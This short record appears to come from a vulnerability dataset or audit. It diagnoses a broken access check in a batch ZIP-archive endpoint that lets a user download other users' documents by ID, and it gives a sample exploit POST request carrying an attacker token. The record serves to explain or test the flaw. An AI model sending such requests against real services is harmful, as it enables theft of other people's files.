diagnosis: Accepts an array of document IDs in the request body and packages their disk contents into a downloadable ZIP archive. It fails to scope the database query to documents owned by user.id, allowing attackers to include and download files belonging to other users.
exploit_request:
POST /api/documents/batch-archive HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"document_ids": [101, 102, 5002, 5003]}
